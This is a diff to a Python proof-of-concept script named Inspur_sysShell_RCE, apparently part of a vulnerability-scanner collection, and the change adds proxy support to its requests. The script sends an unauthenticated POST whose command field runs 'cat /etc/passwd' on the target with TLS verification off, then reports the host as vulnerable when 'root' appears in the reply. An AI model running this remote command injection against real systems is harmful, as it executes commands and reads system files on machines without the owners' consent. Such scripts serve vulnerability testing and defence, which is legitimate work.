@@ -2,9 +2,8 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-from requests.packages.urllib3.exceptions import InsecurePlatformWarning
-
-
+from Config.config_proxies import proxies
+requests.packages.urllib3.disable_warnings()
 # 脚本信息
 ######################################################
 NAME='Inspur_sysShell_RCE'
@@ -22,8 +21,7 @@ def poc(target):
     }
     data = "op=doPlease&node=cu01&command=cat /etc/passwd"
     try:
-        requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
-        r = requests.post(url=url,headers=headers,data=data,verify=False,timeout=3)
+        r = requests.post(url=url,headers=headers,data=data,verify=False,timeout=3,proxies=proxies)
         if 'root' in r.text and r.status_code ==200:
             result['target'] = target
             result['poc'] = NAME
